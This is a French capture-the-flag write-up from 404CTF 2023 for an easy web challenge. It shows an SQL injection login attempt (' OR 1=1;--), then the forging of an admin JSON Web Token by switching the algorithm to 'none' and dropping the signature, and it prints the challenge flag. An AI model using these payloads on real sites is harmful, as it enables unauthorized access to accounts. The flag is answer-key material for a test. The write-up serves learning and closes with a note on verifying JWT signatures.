****
**Catégorie**: WEB - **Difficulté**: Facile 
# L'Académie du détail

****

***Synopsis*** :
  > Le nez plongé dans votre café noir, vous parcourez d'un rapide coup d'œil la une du journal fraichement paru. L'un des titres vous interpelle :
  
  >> ***Mars 1980 : L'opaque secret du nouveau membre de l'Académie Française.***
  
  >Vous parcourez alors le journal à la recherche de l'article en question. Il énonce :
  
  >>Après des heures de délibération, les Académiciens ont enfin voté pour le nouveau membre de la grande Académie Française. Mais pour des raisons que tout le monde ignore, son nom demeure secret depuis ce jour. Malgré tous leurs efforts, aucun journaliste n'a réussi a obtenir le moindre indice ou la moindre image.
  
  > Interloqué, vous vous rendez compte que l'Académie Française possède un site web. Peut être que la réponse est finalement à portée de tous, voir même plus ... !

<p align="center">
<img alt="Screen Chall Web - Facile - L'Académie du détail" src="https://github.com/Cr4Sh-Ov3R/404CTF-2023-WU/blob/main/assets/l_academie_du_detail/chall.png">
</p>


****

## Home Page 

L'arrivée sur le site agite la réflexion d'un noob comme moi, on y retrouve :

- une série de "mots préférés" mis en avant sur la page (un mot de passe dissimulé ?)
- un caroussel (un indice ou un mot de passe caché ?)
- un lien login (peut-être une faille SQLi)
- je ne trouve rien dans le code source

Bref, plus de questions que de réponses, je décide donc de naviguer sur le site et de relire les règles avant de me précipiter. 

> Ça tombe bien, la majorité des choses que j'ai appris sont interdites, y a plus qu'a trouver autre chose.

<p align="center">
<img alt="Screen Chall Web - Facile - L'Académie du détail - Home page" src="https://github.com/Cr4Sh-Ov3R/404CTF-2023-WU/blob/main/assets/l_academie_du_detail/home.png">
</p>


****

## Fake Flag

Je décide tout de même de tenter l'url /flag (après tout, sait-on jamais) et la **FLAG** ah bah non c'est pas ça : 
***202CTF{Bien_tenté_mais_c'est_pas_ça}***

<p align="center">
<img alt="Screen Chall Web - Facile - L'Académie du détail - Fake Flag" src="https://github.com/Cr4Sh-Ov3R/404CTF-2023-WU/blob/main/assets/l_academie_du_detail/fakeFlag.png">
</p>

****

## Login

Je me dirige donc vers la page login, qui révèle sans surprise un formulaire de connexion et tente :

 - le traditionnel admin sans mot de passe qui me révèle *"Données incomplètes"*
 - Je tente donc un mot de passe "*1234*" pour voir si le user admin existe, ce qui me révèle *"Mot de passe incorrect"*, j'en déduit donc que le user *admin* existe.
 - le traditionnel ' OR 1=1;-- pour me connecter mais en vain. (enfin pas tout à fait car *je suis maintenant connecté en tant que OR11*)

<p align="center">
<img alt="Screen Chall Web - Facile - L'Académie du détail - Home page Identifiée en tant que OR11" src="https://github.com/Cr4Sh-Ov3R/404CTF-2023-WU/blob/main/assets/l_academie_du_detail/OR11.png">
</p>

****
## Page Membres

Surpris d'être identifié, je décide d'aller voir la page "*Liste des membres*" qui est apparue dans le menu, mais ce ne sera pas si simple, il faut que j'arrive à être admin.

<p align="center">
<img alt="Screen Chall Web - Facile - L'Académie du détail - Liste de membres - Patience" src="https://github.com/Cr4Sh-Ov3R/404CTF-2023-WU/blob/main/assets/l_academie_du_detail/patience.png">
</p>

Après avoir fait des recherches sur la personne ayant rejoint l'académie à cette date, je tente de flag le prénom_nom de la personne (Marguerite Yourcenar) avec plein de formats différents mais rien ne flag. (Ils ont bien du rire derrière)

***Il faut que je sois admin.***

****
## Cookies

Je suis identifié, il y a probablement un cookie, go voir les cookies dans mon navigateur. 

Ok j'ai bien un cookie access-token et une valeur séparée de 3 ".", je teste donc de prendre les valeurs séparées et de les décoder de la base64. 

<p align="center">
<img alt="Screen Chall Web - Facile - L'Académie du détail - Liste de membres - Token Initial" src="https://github.com/Cr4Sh-Ov3R/404CTF-2023-WU/blob/main/assets/l_academie_du_detail/tokenInit.png">
</p>

C'est parti sur le bash :

**Partie 1/3** :

```bash
cr4sh@exemple:~$ echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 --decode

{"alg":"HS256","typ":"JWT"}
```

Ok, c'est donc un Json Web Token (JWT) en HMAC SHA-256 (HS256). 

Je vais sur la doc de JWT afin de voir un peu comment il se décompose : *Header*.*Payload*.*Signature*

**Partie 2/3 - Payload** :

```bash
cr4sh@exemple:~$ echo "eyJ1c2VybmFtZSI6Ik9SMTEiLCJleHAiOjE2ODYzODY3NjB9" | base64 -d

{"username":"OR11","exp":1686386760}
```
> Pour les neophytes, ici -d équivaut à --decode présenter avant

J'ai donc mon username *OR11* et la date d'expiration du token (en timestamp)

## Partie 3 - Signature

Je me renseigne donc sur la manière de péter une clef de vérification (clef secrète ici en 256bits) mais je n'ai clairement pas les ressources ici, il va donc falloir que je trouve une autre solution.

Le JWT est effectivement signé mais est-ce que la signature est vérifiée? 

Je teste de modifier le payload en passant ***username*** à ***admin***.

```bash
cr4sh@exemple:~$ echo -n '{"username":"admin","exp":1686386760}' | base64

eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjg2Mzg2NzYwfQ==
```
Une fois converti en base64, je modifie le payload dans mon navigateur (la partie du milieu) en pensant à retirer les "==" de fin , malheureusement la signature m'empêche de valider le jwt et je suis deconnecté. 

Je cherche donc sur la toile et trouve un site m'indiquant que dans le cas où la signature du token n'est pas vérifiée côté serveur, je pouvais tenter un "alg":"none" sans signature après le point suivant le payload sous le format *Header.Payload.*

On a déja modifié le payload, mais mon header est toujours sous algorythme HS256. Je décide d'essayer de me passer de l'algorythme en passant l'algorythme à none.

```bash
cr4sh@exemple:~$ echo -n '{"alg":"none","typ":"JWT"}' | base64

eyJhbGciOiJub25lIiwgInR5cCI6IkpXVCJ9
```

Je modifie donc maintenant mon cookie avec mon HeaderModifié.PayloadModifié.RienPourLaSignature

> eyJhbGciOiJub25lIiwgInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjg2Mzg2NzYwfQ.

<p align="center">
<img alt="Screen Chall Web - Facile - L'Académie du détail - Liste de membres - Token modifié" src="https://github.com/Cr4Sh-Ov3R/404CTF-2023-WU/blob/main/assets/l_academie_du_detail/tokenModifie.png">
</p>

Puis retente d'accéder au contenu de la page liste membre, en étant, du fait de la modification, **admin**.

J'ai désormais bien le nom de la personne que j'avais trouvé précédemment "*Marguerite Yourcenar*" avec le flag. 

<p align="center">
<img alt="Screen Chall Web - Facile - L'Académie du détail - Liste de membres - Flag" src="https://github.com/Cr4Sh-Ov3R/404CTF-2023-WU/blob/main/assets/l_academie_du_detail/flag.png">
</p>

<details>
<summary>Voir le flag :</summary>
FLAG : 404CTF{JWT_M41_1MP13M3N73_=L35_Pr0813M35}
</details>

****
**Notes** :
On entends bien souvent que JWT est inviolable et que c'est le graal de la sécurité. 

Attention cependant, comme tout outil, si la vérification n'est pas faite ou pas de la bonne manière, il est de fait possible de l'outrepasser.

Ce chall m'a également permis de découvrir l'outil CyberChef qui devrait se révéler très utile à l'avenir

****
**404CTF 2023** - *Cr4Sh*
****
